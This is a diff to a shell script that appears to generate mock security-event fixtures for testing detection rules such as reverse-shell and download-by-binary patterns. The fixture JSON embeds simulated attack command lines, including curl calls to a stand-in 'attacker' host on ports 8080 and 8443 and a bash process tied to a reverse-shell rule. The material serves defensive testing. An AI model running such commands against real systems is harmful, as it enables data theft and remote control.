@@ -28,6 +28,7 @@ for arg in "$@"; do
 done
 
 severity="high"
+terminal=false
 missing='null'
 events='[]'
 case "$rule" in
@@ -37,6 +38,17 @@ case "$rule" in
   download_by_lolbin)
     severity="medium"
     events="[{\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/usr/bin/curl\",\"argv\":[\"curl\",\"http://attacker:8080/file?marker=$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8080\"}}}]"
+    ;;
+  reverse_shell_pattern)
+    severity="critical"
+    terminal=true
+    events="[{\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/bin/bash\",\"argv\":[\"/bin/bash\",\"$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8443\"}}}]"
+    ;;
+  suspicious_exec_connect)
+    events="[\
+      {\"event\":{\"behavior\":\"process.exec\",\"subjectProc\":{\"binary\":\"/bin/sh\",\"argv\":[\"/bin/sh\",\"/tmp/.sysarmor-attack/$marker\"]}}},\
+      {\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/usr/bin/curl\",\"argv\":[\"curl\",\"http://attacker:8443/control?marker=$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8443\"}}}\
+    ]"
     ;;
   payload_lifecycle)
     events="[\
@@ -50,10 +62,12 @@ esac
 
 case "$case_name" in
   wrong-severity) severity="low" ;;
+  wrong-terminal) [[ "$terminal" == true ]] && terminal=false || terminal=true ;;
   missing-ref) missing='["event-missing"]' ;;
   missing-behavior) events="$(printf '%s' "$events" | jq -c '[.[] | select(.event.behavior != "file.write")]')" ;;
-  wrong-port) events="$(printf '%s' "$events" | sed 's/:8080/:80/g')" ;;
+  wrong-port) events="$(printf '%s' "$events" | sed -e 's/:8080/:80/g' -e 's/:8443/:4443/g')" ;;
 esac
 
-jq -cn --arg rule "$rule" --arg severity "$severity" --argjson missing "$missing" --argjson events "$events" \
-  '{eventFrames:$events,missingEventRefs:$missing,signalFrame:{signal:{ruleId:$rule,severity:$severity}}}'
+jq -cn --arg rule "$rule" --arg severity "$severity" --argjson terminal "$terminal" \
+  --argjson missing "$missing" --argjson events "$events" \
+  '{eventFrames:$events,missingEventRefs:$missing,signalFrame:{signal:{ruleId:$rule,severity:$severity,terminal:$terminal}}}'
